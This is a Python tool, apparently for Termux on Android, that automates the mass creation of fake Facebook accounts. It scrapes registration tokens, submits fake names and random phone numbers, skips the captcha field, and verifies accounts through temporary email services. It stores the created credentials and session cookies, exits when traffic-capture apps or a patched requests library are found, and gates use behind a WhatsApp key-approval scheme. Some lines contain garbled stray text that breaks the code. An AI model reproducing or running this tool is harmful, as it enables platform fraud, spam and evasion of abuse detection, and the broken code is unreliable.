#-----------------(import modules)---------

import sys,os,time,random
#-----------------(clear terminal screen)---------
os.system('clear')
#-----------------(main code)---------
def loading_animation():
    animation = ['[■□□□□□□□□□]','[■■□□□□□□□□]','[■■■□□□□□□□]','[■■■■□□□□□□]','[■■■■■□□□□□]','[■■■■■■□□□□]','[■■■■■■■□□□]','[■■■■■■■■□□]','[■■■■■■■■■□]','[■■■■■■■■■■]']
    num_iterations = 2
    counter = 0
    for i in range(10):
        color_code = random.randint(91, 96)
        colored_animation = animation[i % len(animation)].replace('■', f'''\x1b[1;{color_code}m■\x1b[0m''')
        sys.stdout.write('\r- Script Is Running ' + colored_animation)
        sys.stdout.flush()
        time.sleep(0.1)
    counter += 1
    if counter >= num_iterations:
        pass
import os,json,hashlib,io,struct
os.system('clear')
#print('\n\n Checking for modules! ')
print(' ')
from requests import api
from urllib3 import connection
from urllib import request
from requests import sessions
from requests import models
from requests import utils
from requests import adapters
from requests import cookies
from requests import compat
from requests import hooks
from requests import exceptions
from requests import certs
from requests import structures
from requests import auth
from requests import packages
import os, requests, re, time, sys, random, json
from concurrent.futures import ThreadPoolExecutor as Thread
import marshal,zlib
import re,uuid,sys,random,time,os,subprocess,platform
try:
    from bs4 import BeautifulSoup as sp
    from fake_email import Email
    from concurrent.futures import ThreadPoolExecutor as Thread
    import requests
except:
    os.system('pip install bs4 fake_email futures requests ')
    from bs4 import BeautifulSoup as sp
    from fake_email import Email
    from concurrent.futures import ThreadPoolExecutor as Thread
    import requests
import urllib.request
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY HxM');exit()
        else:exit()
    except:exit()
#<<_________[ SECURITY CODE ]_________>>#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"\033[97;1m [\033[92;1m•\033[97;1m] Ple"+"ase Allo"+"w Sto"+"rage P"+"ermi"+"ssio"+"n Fo"+"r Sa"+"ve Fi"+"le Th"+"en R"+"un A"+"gain");os.system('termux-setup-storage');os.system('clear');exit(f"\033[97;1m [\033[92;1m•\033[97;1m] Ru"+"n Aga"+"in Thi"+"s To"+"ol !!")
try:
    fileee = os.listdir("/sd"+"card/"+"Andr"+"oid/"+"data/")
    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
        print('Ple'+'ase un'+'inst'+'all htt'+'p cana'+'ry fr'+'om y'+'our d'+'evice');exit()
except:pass
style = f"\033[97;1m [\033[92;1m•\033[97;1m]"
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.11/s'+'ite-packages/'
warning = "Do Not Try Bypass & Capture ...!"
pipo = 'p'+'ip unin'+'stall requ'+'ests cha'+'rdet ur'+'lli'+'b3 id'+'na cer'+'tifi -'+'y;pi'+'p ins'+'tall cha'+'rdet urll'+'ib3 idn'+'a cer'+'tifi re'+'ques'+'ts'
try:
    king=f'{site}reque'+'sts/'
    if not 'print' in open(king+'sess'+'ions.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    qeen=f'{site}reque'+'sts/'
    if not 'print' in open(qeen+'mod'+'els.py','r').read():pass
    else:exit(f"{style} {warning} ")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
#

sys.stdout.write('\x1b]2;🅂🄰🅀🄸😈\x07')
def linex():
    print('\033[1;36m==============================================')
'''-------#clour#------'''

whi = "\033[1;97m"
yal = "\033[1;93m"
red = "\033[1;91m"
gren = "\033[1;92m"
'''-------------------------'''
ok=0
mthd=[]
def lop(text):
    sys.stdout.write(f'\r\r\r\033[0m{text}             \r');sys.stdout.flush()
tm=[]
tm=[]
logo = f"""\033[37m                 
 
 _______  _______  _______ _________
(  ____ \(  ___  )(  ___  )\__   __/
| (    \/| (   ) || (   ) |   ) (   
| (_____ | (___) || |   | |   | |   
(_____  )|  ___  || |   | |   | |   
      ) || (   ) || | /\| |   | |   
/\____) || )   ( || (_\ \ |___) (___
\_______)|/     \|(____\/_)\_______/                                    
\n\033[1;37mAUTHER   : \x1b[38;5;205mONE MAN ARMY 
\033[1;37mFACEBOOK : \x1b[38;5;205mISSA-AWAN    
\033[1;37mGITHUB \033[1;37m  : \x1b[38;5;205mSAQI-JD
\033[1;37mVERSION  : \x1b[38;5;205m2.2
\033[1;37mTOOL : \033[1;37mAUTO FB CREATE\x1b[0m"""
#print(logo)
def clr():
    os.system('clear')
    print(logo);linex()




def menu():
    
    clr()
    print ('Use M1 For Fast Response ')
    for i in range(1, 3):
        print(f'[{i}] Method ')
    linex()

    mt = input('[?] Select: ')
    if mt == "1":
        mthd.append("1")
    else:
        mthd.append("2")
    linex()

    m = "2"
    if m == "1":
        tm.append("one")
    else:
        tm.append('two')
    Create()


def gri():
    ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return ip_address

def rnd(a,b):
    return str(random.randint(a,b))



def random_ua():
    def random_version():
        return f"{random.randint(201, 301)}.0.0.{random.randint(2, 51)}.{random.randint(101, 1000)}"

    def random_density():
        return f"{random.uniform(2.0, 4.0):.2f}"

    def random_device():
        devices = [
            'samsung', 'huawei', 'xiaomi', 'oneplus', 'oppo', 'vivo', 'nokia', 'lg', 'sony', 'htc',
            'motorola', 'lenovo', 'asus', 'zte', 'realme', 'blackberry', 'meizu', 'alcatel', 'coolpad', 'google'
        ]
        return random.choice(devices)

    def random_model():
        models = [
            'SM-S367VL', 'SM-N960U', 'SM-G611L', 'SM-G996N', 'SM-G870W', 
            'SM-G950F', 'SM-T116NQ', 'SM-G955N', 'SM-G389F', 'SM-G981B',
            'Pixel 4', 'Pixel 5', 'Pixel 6', 'Pixel 7', 'Moto G Power',
            'Moto E6', 'Moto G Stylus', 'Lenovo K10', 'Asus ROG Phone', 'ZenFone 7',
            'OnePlus 8', 'OnePlus 9', 'OnePlus Nord', 'Xiaomi Mi 11', 'Xiaomi Redmi Note 10',
            'Oppo Reno 5', 'Vivo Y20', 'Vivo V21', 'Huawei P30', 'Huawei Mate 40'
        ]
        return random.choice(models)

    def random_locale():
        locales = [
            'en_US', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'pt_BR', 'zh_CN', 'ja_JP', 'ko_KR',
            'ru_RU', 'ar_AE', 'tr_TR', 'hi_IN', 'th_TH', 'vi_VN', 'nl_NL', 'sv_SE', 'pl_PL'
        ]
        return random.choice(locales)

    def random_carrier():
        carriers = [
            'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'Orange', 'Telekom', 'Movistar',
            'Claro', 'Telcel', 'Bell', 'Rogers', 'Telstra', 'Optus', 'SingTel', 'M1', 'StarHub'
        ]
        return random.choice(carriers)

    fban_template = (
        "[FBAN/FB4B;FBAV/{version};FBBV/{version_code};"
        "FBDM/{{density={density},width={width},height={height}}};"
        "FBLC/{locale};FBRV/{random_num};FBCR/{carrier};"
        "FBMF/{manufacturer};FBBD/{brand};FBPN/com.facebook.katana;"
        "FBDV/{device_model};FBSV/{os_version};FBOP/20;FBCA/armeabi-v7a:armeabi;]"
    )

    version = random_version()
    version_code = random.randint(100000001, 200000001)
    density = random_density()
    width = random.randint(721, 1441)
    height = random.randint(1281, 2561)
    locale = random_locale()
    random_num = random.randint(100000001, 999999999)
    carrier = random_carrier()
    manufacturer = random_device()
    brand = manufacturer
    device_model = random_model()
    os_version = random.randint(9, 14)

    fban_user_agent = fban_template.format(
        version=version,
        version_code=version_code,
        density=density,
        width=width,
        height=height,
        locale=locale,
        random_num=random_num,
        carrier=carrier,
        manufacturer=manufacturer,
        brand=brand,
        device_model=device_model,
        os_version=os_version
    )

    return fban_user_agent
def find(txtt,wrd):
       xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
       return xx


class Create:
    def __init__(self):
        clr()
        for i in range(76000):
            self.start()
    def process(self,pas,m):
        global ok
        ip=str(gri())
        session=requests.Session()
        num="+923"+rnd(0,4)+rnd(11111111,99999999)
        self.ua= random_ua()
        lop("\033[1;37m[SAQI-M1] % "+num)
      #  lop('\r\r\033[1;37m [SAQI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(lop,len(oks)));sys.stdout.flush()
        self.m = ['Anaya|Khan','Aleza|Doll','Fatima|Queen','Muskan|Khan','Ruksar|Khan','Sonia|Khan','Tasleem|Rani','Rani|Parveen','Asma|Malik','Komal|Queen','Saba|Khan','Maham|Princess','Ayesha|Begum','Hira|Jaan','Iqra|Bibi','Sara|Khan','Maryam|Doll','Zara|Rani','Sana|Parveen','Mehwish|Queen','Zoya|Khan','Sidra|Princess','Amna|Malik','Nadia|Begum','Nida|Parveen','Shazia|Quee','Nazia|Rani','Rabia|Khan','Saima|Jaan','Bushra|Doll','Shumaila|Princess','Sadaf|Malik','Saira|Begum','Lubna|Khan','Kiran|Parveen','Sehrish|Rani','Nosheen|Queen','Urooj|Khan','Mahira|Doll','Nayab|Princess','Samina|Malik','Farah|Begum','Sumaira|Khan','Iram|Jaan','Naheed|Parveen','Afshan|Rani','Sobia|Queen','Zainab|Khan','Humaira|Doll','Reema|Princess','Muniza|Malik','Yasmeen|Begum','Shaista|Khan','Saima|Jaan','Bushra|Doll','Shumaila|Princess','Sadaf|Malik','Saira|Begum','Lubna|Khan','Kiran|Parveen','Sehrish|Rani','Nosheen|Queen','Urooj|Khan','Mahira|Doll','Nayab|Princess','Samina|Malik','Farah|Begum','Sumaira|Khan','Iram|Jaan','Naheed|Parveen','Afshan|Rani','Sobia|Queen','Zainab|Khan','Humaira|Doll','Reema|Princess','Muniza|Malik','Yasmeen|Begum','Shaista|Khan']
        if m =="1":
            response1 = session.get('https://web.facebook.com/r.php')
            captcha_persist_data = re.search('name="captcha_persist_data" value="(.*?)"', str(response1.text)).group(1)
            reg_instance = re.search('name="reg_instance" value="(.*?)"', str(response1.text)).group(1)
            haste_session = re.search('"haste_session":"(.*?)"', str(response1.text)).group(1)
            hsi = re.search('"hsi":"(.*?)"', str(response1.text)).group(1)
            spin_t = re.search('"__spin_t":(.*?),', str(response1.text)).group(1)
            spin_r = re.search('"__spin_r":(.*?),', str(response1.text)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(response1.text)).group(1)
            lsd = re.search('name="lsd" value="(.*?)"', str(response1.text)).group(1)
            ri = re.search('name="ri" value="(.*?)"', str(response1.text)).group(1)
            data = {'jazoest': jazoest,'lsd': lsd,'firstname': random.choice(self.m).split("|")[0],'lastname': random.choice(self.m).split("|")[1],'reg_email__': num,'reg_email_confirmation__':num,'reg_passwd__': pas,'birthday_day': str(random.randint(1,28)),'birthday_month': str(random.randint(1,11)),'birthday_year': str(random.randint(1978,2002)),'birthday_age': '','did_use_age': 'false','sex': '2','preferred_pronoun': '','custom_gender': '','referrer': '','asked_to_login': '0','use_custom_gender': '','terms': 'on','ns': '0','ri': ri,'action_dialog_shown': '','ignore': 'captcha','locale': 'en_GB','reg_instance': reg_instance,'captcha_persist_data': captcha_persist_data,'captcha_response': '','__user': '0','__a': '1','__req': '8','__hs': haste_session,'dpr': '2','__ccg': 'GOOD','__rev': spin_r,'__s': '0fk0jz:jng6tr:a3pmr9','__hsi': hsi,'__dyn': '','__csr': '','__spin_r': spin_r,'__spin_b': 'trunk','__spin_t': spin_t}
            self.h3dx = {'authority': 'www.facebook.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.facebook.com','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': self.ua,'viewport-width': '980','x-asbd-id': '129477','x-fb-lsd': lsd}
            req = session.post('https://www.facebook.com/ajax/register.php',data=data,headers=self.h3dx).text
        else:
            response1=session.get("https://m.facebook.com/reg")
            lsd=re.search('name="lsd" value="(.*?)"',str(response1.text)).group(1)
            jazo=re.search('name="jazoest" value="(.*?)"',str(response1.text)).group(1)
            inta=re.search('name="reg_instance" value="(.*?)"',str(response1.text)).group(1)
            impres=re.search('name="reg_impression_id" value="(.*?)"',str(response1.text)).group(1)
            tok = re.search('privacy_mutation_token=(.*?)"',str(response1.text)).group(1)
            headers = {
            'authority': 'm.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/reg/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6833B"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.ua,
            'viewport-width': '360',
            'x-asbd-id': '129477',
            'x-fb-lsd': lsd,
            }
            params = {
            'privacy_mutation_token': tok,
            'app_id': '103',
            'multi_step_form': '1',
            'skip_suma': '0',
            'shouldForceMTouch': '1',
            }
            data = {
            'ccp': '2',
            'reg_instance': inta,
            'submission_request': 'true',
            'helper': '',
            'reg_impression_id': impres,
            'ns': '1',
            'zero_header_af_client': '',
            'app_id': '103',
            'logger_id': str(uuid.uuid4()),
            'field_names[0]': 'firstname',
            'firstname': random.choice(self.m).split("|")[0],
            'lastname': random.choice(self.m).split("|")[1],
            'field_names[1]': 'birthday_wrapper',
            'birthday_day': rnd(5,26),
            'birthday_month': rnd(1,12),
            'birthday_year': rnd(1977,2002),
            'age_step_input': '',
            'did_use_age': 'false',
            'field_names[2]': 'reg_email__',
            'reg_email__': num,
            'field_names[3]': 'sex',
            'sex': '1',
            'preferred_pronoun': '',
            'custom_gender': '',
            'field_names[4]': 'reg_passwd__',
            'name_suggest_elig': 'false',
            'was_shown_name_suggestions': 'false',
            'did_use_suggested_name': 'false',
            'use_custom_gender': 'false',
            'guid': '',
            'pre_form_step': '',
            'reg_passwd__': pas,
            'submit': 'Sign Up',
            'jazoest': jazo,
            'lsd': lsd,
            '__dyn': '',
            '__csr': '',
            '__req': 'f',
            '__a': '',
            '__user': '0',
            }
            koki = (";").join([ "%s=%s" % (key, value) for key, value in response1.cookies.get_dict().items() ])
            koki+=';m_pixel_ratio=2.625;wd=412x756'
            response = session.post('https://m.facebook.com/reg/submit/', params=params, cookies={"cookie":koki}, headers=headers, data=data)

        response=session.get("https://mbasic.facebook.com")       
        if "checkpoint" in response.text:
            lop(" Account is Failed ")
            return "chk"
        if not "c_user" in dict(session.cookies):         
            lop(" Failed To Create")
            return 0
        print("\033[1;37m[\033[1;33m√\033[1;37m] \033[37mAccount is Live ")
        headers = {
        'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-PK, en;q=0.9, en-US;q=0.8, en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
        'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '21',
        'upgrade-insecure-requests': '1',
        'user-agent':self.ua,
        }
        for i in  re.findall('href="(.*?)"',response.text.replace("amp;","")):
          if "changeemail" in i:
            url=i
        response = session.get("https://mbasic.facebook.com"+url, headers=headers)
        w = tm[0]
        if "two" ==w:
            from fake_email import Email
            mmail=Email().Mail()
            em=mmail['mail']
        else:
            pos = requests.post('https://api.internal.temp-mail.io/api/v3/email/new').json()
            em = pos['email']
        headers = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-PK, en;q=0.9, en-US;q=0.8, en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent':self.ua,
        }
        data = {
            'fb_dtsg': find(response.text,"fb_dtsg"),
            'jazoest': find(response1.text,"jazoest"),
            'old_email': num,
            'reg_instance': find(response1.text,"reg_instance"),
            'new': em,
            'next': '',
            'submit': 'Add'
        }
       # print("[+] Adding  Email")
        url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text.replace("amp;",""))[0]
        response = session.post(url, headers=headers, data=data)
        r=session.get("https://mbasic.facebook.com")
        print("\033[1;37m[\033[1;33m+\033[1;37m]\033[1;37m Added Email : "+em)
        time.sleep(15)
        w = tm[0]
        if "two" ==w:
            h=Email(mmail["session"]).inbox()
            if h:
                j = h['topic'].split('-')[1];hh = j.split(' ')[0]
                cd = hh
        else:
            req = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{em}/messages').json()
            cd = re.search(r'FB-([^ ]+)',str(req)).group(1)
        try:cd
        except:return 0
        print('[\033[1;33m+\033[1;37m]\033[1;37m Code   '+cd)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-ch-ua-platform-version': '11.0.0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':self.ua,
        }
        data = {'c': cd,'fb_dtsg': find(r.text,"fb_dtsg"),'jazoest': find(r.text,"jazoest"),'submit[confirm]': 'Confirm'}
        fn = re.search('method="post" action="(.*?)"', str(r.text)).group(1)
        url = 'https://mbasic.facebook.com'+fn
        response = session.post(url, headers=headers, data=data)
        if "checkpoint" in response.text:
            lop("[×] Account is Failed ")
            return "chk"
        else:
            return session
    def getcok(self,koki):
        Cook = ("c_user=" + koki["c_user"] + ";""xs=" + koki["xs"] + ";""sb=" + koki["sb"] + ";""fr=" + koki["fr"] + ";""datr=" + koki["datr"] + ";""dpr=2" + ";""locale=en_PK" + ";""wd=950x1835" + ";""m_page_voice=" + koki['c_user'] + ";")
        return Cook

    def get(self):
      return random.choice(["-","/","|","\\"])
    def start(self):
     try:
       global ok
       import sys
       pas = "SAQI" + str(random.randint(10000, 111111))
       m = mthd[0]
       ggg=self.process(pas,m)

       if ggg=="chk":
         pass
       elif ggg==0:pass
       else:
          koki = (";").join([ "%s=%s" % (key, value) for key, value in ggg.cookies.get_dict().items() ])
          koki+=';m_pixel_ratio=2.625;wd=412x756'
          dc=dict(ggg.cookies)
          coki = self.getcok(dc)
          uid=re.findall("c_user=(.*?);",coki)[0]
          check = requests.get('https://mbasic.facebook.com',cookies={'cookie':koki}).text
          if "checkpoint" not in str(check):
              ###&&&&&&&print(40*"-")
              print("\033[37m[\033[1;33m√\033[1;37m]\033[1;32m "+uid+' | '+pas)
           #   print('\033[1;35m[\033[1;33mCoki\033[1;35m]\033[1;37m :- '+coki)
            #  os.system('espeak -a 300 " Crack,   Successful,"')              
              linex()
              #####print(40*'\033[37m-')
              ok+=1
              open("/sdcard/SAQI-UPCK-OK.txt","a").write(uid+"|"+pas+"|"+koki+"\n")
              open("/sdcard/SAQI-UP.txt","a").write(uid+"|"+pas+"\n")
            ###  profile(koki)
              ##bio(koki)
              ##subscribe(koki)
              ##otComment(koki)
              ####creatingProfilePage(uid,pas,koki)
          else:pass
     except Exception as e:
         ###print(e)
         if not "urllib" or "perma" in str(e):pass
         time.sleep(2)
     except requests.exceptions.ConnectionError:
         time.sleep(3)
def superuser():
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "72A".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Bittux303/Aproval/blob/main/Aryan.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        menu()
    else:
        os.system("clear")
        print (logo)
        print("\t \033[1;32m First Get Approvel\033[1;37m ")
        time.sleep(1)ucf g tf t gaff fffffgffggff fic
        os.system("clear") gig goff gay gy ggffy yg fgsda gf gag fast
        print(logo)
        linex()
        print(" YOU NEED GET APPROVED FIRST\033[1;37m")
        linex()
        print("\033[1;31m Note : \033[1;37mTHIS TOOL IS FREE JUST GET APRVL FOR SECURITY")
        linex()
        print(" 🔆Your Key is Not Approved 😴")
        print(" 🔰COPY AND SEND ME IN WHATSAPP 🔰")
        linex()
        print (" \033[1;37m🇵🇰Your Key🇵🇰 : "'\033[1;36m'+'SAQI'+id);linex()
        name = input(" PUT YOUR NAME : ")
        input(" 😁PRESS ENTER TO SEND KEY⏩");linex()
        time.sleep(3.5)
        tks = ''+name+'SAQI'+id
        os.system('am start https://wa.me/+923229502380?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*SAQI*%20*PAID*%20*TOOL*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20' + tks)
        superuser()
superuser()
#menu()

